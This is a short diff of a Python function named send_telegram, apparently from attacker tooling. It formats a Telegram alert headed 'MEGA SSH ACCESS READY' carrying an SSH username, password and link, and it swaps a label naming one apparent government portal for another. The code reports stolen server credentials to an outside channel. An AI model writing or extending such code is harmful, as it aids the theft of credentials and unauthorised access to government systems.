@@ -95,7 +95,7 @@ def send_telegram(url):
     clean_url = url.replace("https://", "")
     message = (
         "🔥 *MEGA SSH ACCESS READY* 🔥\n\n"
-        "portalkc_dia_gov_cz\n"
+        "cms_tciscr_gov_sd\n"
         f"👤 *User:* `{USER_SSH}`\n"
         f"🔑 *Pass:* `{PASS_SSH}`\n"
         f"🌐 *Link:* `{url}`\n\n"
